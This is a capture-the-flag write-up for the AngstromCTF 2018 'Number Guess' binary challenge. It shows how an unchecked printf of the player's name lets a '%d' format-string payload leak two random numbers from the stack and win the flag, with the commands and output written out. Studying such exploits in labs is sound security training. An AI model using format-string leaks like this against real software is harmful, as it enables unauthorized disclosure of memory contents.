# ANGSTORM CTF 2018: Number Guess

**Team:** ATLEASTWETRIED
**Category:** Binary
**Points:** 70
**Description:**

> Ian loves playing number guessing games, so he went ahead and wrote one himself (source). I hope it doesn't have any vulns. The service is running at nc shell.angstromctf.com 1235.

## Write Up

by Ovais Ellahi

The challenge is provided by https://angstromctf.com/problems

We are given two files, an elf 64-bit executable:

```bash
$ file guessPublic64
guessPublic64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0b444932c543f786c9e9b95ef43415fa0564c0a6, not stripped
```

and a c source file guessPublic.c.

When running the executable, we are asked to input a name, and then guess a random number within a range.

```bash
$ ./guessPublic64 
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
Ovais Ellahi
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
Ovais Ellahi's guess: 2314145 
Sorry, the answer was 1070812. Try again :(
```
To find an entry to exploit this problem, using `radare2` I list out all of the functions available in this executable:

```bash
$ r2 guessPublic64
 -- Use '-e bin.strings=false' to disable automatic string search when loading the binary.
[0x00400770]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00400770]> afl
0x00400680    3 26           sym._init
0x004006b0    1 6            sym.imp.puts
0x004006c0    1 6            sym.imp.strlen
0x004006d0    1 6            sym.imp.__stack_chk_fail
0x004006e0    1 6            sym.imp.printf
0x004006f0    1 6            sym.imp.__libc_start_main
0x00400700    1 6            sym.imp.srand
0x00400710    1 6            sym.imp.fgets
0x00400720    1 6            sym.imp.time
0x00400730    1 6            sym.imp.fflush
0x00400740    1 6            sym.imp.__isoc99_sscanf
0x00400750    1 6            sym.imp.rand
0x00400760    1 6            fcn.00400760
0x00400770    1 41           entry0
0x004007a0    4 50   -> 41   sym.deregister_tm_clones
0x004007e0    3 53           sym.register_tm_clones
0x00400820    3 28           sym.__do_global_dtors_aux
0x00400840    4 38   -> 35   entry1.init
0x00400866    6 485          main
0x00400a50    4 101          sym.__libc_csu_init
0x00400ac0    1 2            sym.__libc_csu_fini
0x00400ac4    1 9            sym._fini
```

It seems that the printf function is used to print out the name we input in the program.
That is our entry point, since now instead we can use format strings to directly print out values from the stack. 

But first, I had to look through the c source file to see how the random number is generated.

```bash
	srand(time(NULL));
	int rand1 = rand() % 1000000;
	int rand2 = rand() % 1000000;

	printf(buf);
	fflush(stdout);
	int guess;
	char num[8];
	fgets(num,8,stdin);
	sscanf(num,"%d",&guess);

	if (guess == rand1+rand2){
		printf("Congrats, here's a flag: %s\n", flag);
	} else {
		printf("Sorry, the answer was %d. Try again :(\n", rand1+rand2); 
	}

```

Looking at this code, we see that the number we have to guess is found by generating two random numbers between 1 and 1000000, and then adding them up. 

Since these two random numbers are stored as local variables on to the stack, we can exploit printf and use format strings to print out the stack and find those variables. 

To do this, I first try  "%d" * 10 as the input for the name to see the results:

```bash
$ ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%d %d %d %d %d %d %d %d %d %d
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
-921623700 1400 121043 -378421084 -378420960 -921623384 0 4196944 213548 -921623392's
guess: Sorry, the answer was 334591. Try again :(
```
Looking through the 10 decimal numbers, we can disregard the negative numbers, and numbers greater than the answer, which leaves us with `1400 121043 213548`.

By adding 121043 and 213548 gives us 334591, which was the answer. So it is positions 3 and 9 in the output, where the two local variables holding a random number lie.

Now we can simply input the same string and add the third and ninth decimals as our answer to get the string:

```bash
$ ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%d %d %d %d %d %d %d %d %d
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
1291100892 625 266123 -1343201116 -1343200992 1291101208 0 4196944 409334's guess: 675457
Congrats, here's a flag: REDACTED
```

There we go. We were able to guess the correct number and retrieve the flag.
